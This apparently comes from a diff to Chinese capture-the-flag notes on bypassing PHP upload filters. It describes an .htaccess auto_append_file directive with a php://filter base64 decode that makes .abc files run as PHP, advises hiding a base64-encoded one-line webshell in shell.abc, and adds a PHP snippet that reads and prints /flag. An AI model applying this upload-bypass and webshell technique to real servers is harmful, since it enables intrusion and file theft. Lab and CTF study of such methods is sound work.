@@ -10,3 +10,11 @@ php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.ab
 这样，您就可以把后缀为.abc的文件当作php解析，然后在shell.abc文件中写入用base64加密的一句话木马。例如，您可以把<?php phpinfo ();?>加密成PD9waHAgcGhwaW5mbygpOz8+12。
 
 使用其他字符代替“<?”，例如“<%”或“<#”，然后在.htaccess文件中设置相应的解析规则。例
+
+<?php
+// 读取根目录文件：/flag
+$content = file_get_contents("/flag");
+// 输出文件内容
+echo $content;
+?>
+
